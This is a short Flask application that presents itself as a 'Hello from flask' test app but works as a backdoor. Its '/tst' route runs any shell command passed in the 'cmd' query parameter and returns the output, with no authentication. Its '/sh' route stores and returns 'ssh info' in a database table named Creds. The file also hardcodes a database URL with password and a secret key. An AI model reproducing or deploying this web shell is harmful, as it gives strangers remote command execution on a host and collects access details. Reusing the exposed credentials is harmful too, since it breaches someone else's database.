import subprocess
import werkzeug
import datetime as dt
from flask import Flask, request
from flask_sqlalchemy import SQLAlchemy
# from flask_frozen import Freezer

app = Flask(__name__)
# freezer=Freezer(app)
app.config['SQLALCHEMY_DATABASE_URI'] = "postgresql://kkqrgbst:rc4beJBMClJJiJHixihVx2ivILke0znR@arjuna.db.elephantsql.com/kkqrgbst"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = '1192b6f912b6e07ab9fb30tf'
db = SQLAlchemy(app)

class Creds(db.Model):
    id= db.Column(db.Integer, primary_key=True)
    inf=db.Column(db.String(200))

    def __repr__(self):
        return f"<Creds index {self.id}> "


@app.route('/')
def index():
    return "Hello from flask"


@app.route('/tst')
def tst():
    try:
        cmd = request.args['cmd'].split()
    except werkzeug.exceptions.BadRequestKeyError:
        return "Hello This is a test page"
    out = (subprocess.check_output(cmd)).decode('utf-8')
    return f"cmd was : {' '.join(cmd)} <br> output is:<br> {out}"


@app.route('/sh')
def shell():
    try:
        up = request.args['up']
        Creds.query.filter_by(id=1).first().inf=f"{up}"
        db.session.commit()
        return f"Successfully added ssh info as {up}"
    except werkzeug.exceptions.BadRequestKeyError:
        return Creds.query.filter_by(id=1).first().inf


if __name__ == "__main__":
    app.run(debug="True")
    # freeze.run()
